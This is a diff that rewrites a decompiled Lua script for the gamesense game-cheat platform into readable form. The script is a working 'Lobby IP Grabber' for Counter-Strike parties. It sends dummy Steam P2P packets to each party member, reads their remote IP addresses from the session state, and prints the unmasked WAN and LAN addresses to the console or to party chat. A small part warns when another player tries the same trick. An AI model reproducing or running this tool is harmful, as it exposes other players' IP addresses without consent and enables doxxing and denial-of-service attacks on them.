@@ -1,153 +1,179 @@
-slot0 = require("gamesense/steamworks")
-slot1 = slot0.ISteamNetworking
-slot2 = panorama.open()
-slot3 = slot2["$"]
-slot4 = slot2.MyPersonaAPI
-slot5 = slot2.PartyListAPI
-slot6 = slot2.GameStateAPI
-slot7 = slot2.LobbyAPI
-slot8 = slot0.EP2PSessionError
-slot9 = slot0.EP2PSend
-slot10 = {}
-slot11 = {}
-slot12 = {}
-slot13, slot14, slot15, slot16 = nil
-slot18 = ui.new_combobox("MISC", "Miscellaneous", "Output", {
-	"Party Chat",
-	"Console"
-})
+local steamworks_api = require("gamesense/steamworks")
+local steam_networking = steamworks_api.ISteamNetworking
+local panorama_api = panorama.open()
+local panorama_dollar = panorama_api["$"]
+local persona_api = panorama_api.MyPersonaAPI
+local party_list_api = panorama_api.PartyListAPI
+local game_state_api = panorama_api.GameStateAPI
+local lobby_api = panorama_api.LobbyAPI
+local session_error = steamworks_api.EP2PSessionError
+local send_flags = steamworks_api.EP2PSend
 
-ui.set(slot18, "Console")
-ui.set_visible(slot18, false)
-ui.set_visible(ui.new_checkbox("MISC", "Miscellaneous", "Mask IPs"), false)
-ui.set_visible(ui.new_button("MISC", "Miscellaneous", "Grab", function ()
-	uv0()
-end), false)
-ui.set_callback(ui.new_checkbox("MISC", "Miscellaneous", "Lobby IP Grabber"), function (slot0)
-	slot1 = ui.get(slot0)
-
-	ui.set_visible(uv0, slot1)
-	ui.set_visible(uv1, slot1)
-	ui.set_visible(uv2, slot1)
-end)
-
-function slot21(...)
-	if ui.get(uv0) == "Console" then
-		print(table.concat(table.pack(...), " "))
-	elseif slot0 == "Party Chat" then
-		uv1(slot2)
-	end
-end
-
-slot0.set_callback("P2PSessionRequest_t", function (slot0)
-	slot1, slot2 = uv0.GetP2PSessionState(slot0.m_steamIDRemote)
-
-	if not uv1.IsPartyMember(tostring(slot0.m_steamIDRemote)) then
-		return
-	end
-
-	slot10 = ") might be trying to steal your ip!"
-
-	print("[POTENTIAL GRABBER] ", uv2.GetFriendName(slot3), " (", slot0.m_steamIDRemote, slot10)
-
-	for slot10 = 1, 10 do
-		client.delay_call(slot5 == 1 and 0 or (slot10 - 1) * 10 / 1000, function ()
-			uv0.DispatchEvent("PlaySoundEffect", "container_weapon_ticker", "MOUSE")
-		end)
-	end
-end)
-
-function slot13()
-	uv0 = {}
-	uv1 = {}
-	uv2 = {}
-	uv3 = true
-
-	for slot3 = 0, uv4.GetCount() - 1 do
-		if uv4.GetXuidByIndex(slot3):len() > 7 and slot4 ~= uv5.GetXuid() then
-			slot5 = uv6.SteamID(slot4)
-			uv0[#uv0 + 1] = slot5
-			uv1[slot5] = uv4.GetFriendName(slot4)
-
-			uv7.SendP2PPacket(slot5, "asdf", 4, uv8.UnreliableNoDelay, 0)
-		end
-	end
-
-	uv9("[[ IP GRABBER ]]")
-	uv9("# Added " .. #uv0 .. " to queue!")
-	uv9("# Waiting 5 secs...")
-	client.delay_call(5, function ()
-		uv0 = false
-		slot1 = (ui.get(uv1) == "Party Chat" and "𝗪𝗔𝗡" or "WAN") .. ": "
-		slot2 = (slot0 == "Party Chat" and "𝗟𝗔𝗡" or "LAN") .. ": "
-
-		for slot6, slot7 in pairs(uv2) do
-			for slot12, slot13 in ipairs(slot7) do
-				slot8 = "" .. (#slot7 == 1 and slot1 or slot12 == 1 and slot2 or slot1) .. uv3(slot13, ui.get(uv4)) .. (#slot7 == 1 and "" or slot12 == 1 and " | " or "")
-			end
-
-			slot9, slot10 = renderer.measure_text(nil, uv5[slot6])
-
-			uv6(string.sub(uv5[slot6], 1, 25) .. ":", slot8)
-		end
-	end)
-end
-
-slot22 = {
+local queued_steam_ids = {}
+local steam_id_to_name = {}
+local steam_id_to_ips = {}
+local scanning_active = false
+local blocked_ids = {
 	["76561198108791626"] = true,
 	["76561198237598500"] = true,
 	["76561198089758951"] = true,
 	["76561198861797912"] = true,
 	["76561198148192561"] = true
 }
+local scan_lobby_for_ips
+local collect_peer_ips
+local close_open_sessions
+local print_lobby_results
 
-function ()
-	for slot3, slot4 in ipairs(uv0) do
-		slot5, slot6 = uv1.GetP2PSessionState(slot4)
+local output_mode = ui.new_combobox("MISC", "Miscellaneous", "Output", {
+	"Party Chat",
+	"Console"
+})
 
-		if slot6.m_nRemoteIP ~= 0 then
-			uv2[slot4] = uv2[slot4] or {}
-			slot7 = false
+ui.set(output_mode, "Console")
+ui.set_visible(output_mode, false)
 
-			for slot11, slot12 in ipairs(uv2[slot4]) do
-				if slot12 == slot6.m_nRemoteIP then
-					slot7 = true
+local mask_ips = ui.new_checkbox("MISC", "Miscellaneous", "Mask IPs")
+ui.set_visible(mask_ips, false)
+
+local grab_button = ui.new_button("MISC", "Miscellaneous", "Grab", function()
+	scan_lobby_for_ips()
+end)
+ui.set_visible(grab_button, false)
+
+ui.set_callback(ui.new_checkbox("MISC", "Miscellaneous", "Lobby IP Grabber"), function(toggle)
+	local enabled = ui.get(toggle)
+
+	ui.set_visible(output_mode, enabled)
+	ui.set_visible(mask_ips, enabled)
+	ui.set_visible(grab_button, enabled)
+end)
+
+local function send_party_chat(message)
+	panorama_api.SessionCommand("Game::Chat", string.format("run all xuid %s chat %s", game_state_api.GetXuid(), message:gsub(" ", "\194\160")))
+end
+
+local function log_message(...)
+	if ui.get(output_mode) == "Console" then
+		print(table.concat(table.pack(...), " "))
+	elseif ui.get(output_mode) == "Party Chat" then
+		send_party_chat(table.concat(table.pack(...), " "))
+	end
+end
+
+local function format_ip(ip_value, masked)
+	ip_value = tonumber(ip_value)
+
+	local octet_a = math.floor(ip_value / 16777216)
+	local octet_b = math.floor((ip_value - octet_a * 16777216) / 65536)
+	local octet_c = math.floor((ip_value - octet_a * 16777216 - octet_b * 65536) / 256)
+	local octet_d = math.floor(ip_value - octet_a * 16777216 - octet_b * 65536 - octet_c * 256)
+
+	if masked then
+		return octet_a .. "." .. octet_b .. ".xxx.xxx"
+	end
+
+	return octet_a .. "." .. octet_b .. "." .. octet_c .. "." .. octet_d
+end
+
+function print_lobby_results()
+	for steam_id, ip_list in pairs(steam_id_to_ips) do
+		local name = steam_id_to_name[steam_id] or tostring(steam_id)
+		local line_prefix = name .. ": "
+		local output_line = ""
+
+		for index, ip_value in ipairs(ip_list) do
+			local prefix = #ip_list == 1 and "WAN: " or index == 1 and "LAN: " or "WAN: "
+			output_line = output_line .. prefix .. format_ip(ip_value, ui.get(mask_ips)) .. (#ip_list == 1 and "" or index == 1 and " | " or "")
+		end
+
+		log_message(line_prefix, output_line)
+	end
+end
+
+function collect_peer_ips()
+	for _, steam_id in ipairs(queued_steam_ids) do
+		local _, session_state = steam_networking.GetP2PSessionState(steam_id)
+
+		if session_state.m_nRemoteIP ~= 0 then
+			steam_id_to_ips[steam_id] = steam_id_to_ips[steam_id] or {}
+
+			local already_recorded = false
+			for _, known_ip in ipairs(steam_id_to_ips[steam_id]) do
+				if known_ip == session_state.m_nRemoteIP then
+					already_recorded = true
+					break
 				end
 			end
 
-			if not slot7 and not uv3[tostring(slot4)] then
-				table.insert(uv2[slot4], slot6.m_nRemoteIP)
+			if not already_recorded and not blocked_ids[tostring(steam_id)] then
+				table.insert(steam_id_to_ips[steam_id], session_state.m_nRemoteIP)
 			end
 		end
 	end
 
-	client.delay_call(0.25, uv4)
-end()
-function ()
-	if uv0.IsSessionActive() and not uv1 then
-		for slot3 = 0, uv2.GetCount() - 1 do
-			if uv2.GetXuidByIndex(slot3):len() > 7 and slot4 ~= uv3.GetXuid() then
-				uv5.CloseP2PSessionWithUser(uv4.SteamID(slot4))
+	if scanning_active then
+		client.delay_call(0.25, collect_peer_ips)
+	end
+end
+
+function close_open_sessions()
+	if steam_networking.IsSessionActive() and not scanning_active then
+		for index = 0, party_list_api.GetCount() - 1 do
+			if party_list_api.GetXuidByIndex(index):len() > 7 and party_list_api.GetXuidByIndex(index) ~= game_state_api.GetXuid() then
+				steam_networking.CloseP2PSessionWithUser(steamworks_api.SteamID(party_list_api.GetXuidByIndex(index)))
 			end
 		end
 	end
 
-	client.delay_call(0.01, uv6)
-end()
-
-function slot14(slot0)
-	uv0.SessionCommand("Game::Chat", string.format("run all xuid %s chat %s", uv1.GetXuid(), slot0:gsub(" ", " ")))
+	client.delay_call(0.01, close_open_sessions)
 end
 
-function slot15(slot0, slot1)
-	slot0 = tonumber(slot0)
-	slot2 = math.floor(slot0 / 16777216)
-	slot3 = math.floor((slot0 - slot2 * 16777216) / 65536)
-	slot5 = math.floor(slot0 - slot2 * 16777216 - slot3 * 65536 - math.floor((slot0 - slot2 * 16777216 - slot3 * 65536) / 256) * 256)
+function scan_lobby_for_ips()
+	queued_steam_ids = {}
+	steam_id_to_name = {}
+	steam_id_to_ips = {}
+	scanning_active = true
 
-	if slot1 then
-		return slot2 .. "." .. slot3 .. ".xxx.xxx"
+	for index = 0, party_list_api.GetCount() - 1 do
+		local xuid = party_list_api.GetXuidByIndex(index)
+
+		if xuid:len() > 7 and xuid ~= game_state_api.GetXuid() then
+			local steam_id = steamworks_api.SteamID(xuid)
+
+			queued_steam_ids[#queued_steam_ids + 1] = steam_id
+			steam_id_to_name[steam_id] = party_list_api.GetFriendName(index)
+			steam_networking.SendP2PPacket(steam_id, "asdf", 4, send_flags.UnreliableNoDelay, 0)
+		end
 	end
 
-	return slot2 .. "." .. slot3 .. "." .. slot4 .. "." .. slot5
+	log_message("[[ IP GRABBER ]]")
+	log_message("# Added " .. #queued_steam_ids .. " to queue!")
+	log_message("# Waiting 5 secs...")
+
+	client.delay_call(5, function()
+		scanning_active = false
+		print_lobby_results()
+	end)
+
+	collect_peer_ips()
 end
+
+steamworks_api.set_callback("P2PSessionRequest_t", function(request_event)
+	local remote_steam_id = request_event.m_steamIDRemote
+	local _, session_state = steam_networking.GetP2PSessionState(remote_steam_id)
+
+	if not party_list_api.IsPartyMember(tostring(remote_steam_id)) then
+		return
+	end
+
+	print("[POTENTIAL GRABBER] ", persona_api.GetFriendName(remote_steam_id), " (", remote_steam_id, ") might be trying to steal your ip!")
+
+	for attempt = 1, 10 do
+		client.delay_call(attempt == 1 and 0 or (attempt - 1) * 10 / 1000, function()
+			panorama_dollar.DispatchEvent("PlaySoundEffect", "container_weapon_ticker", "MOUSE")
+		end)
+	end
+end)
+
+client.delay_call(0.01, close_open_sessions)
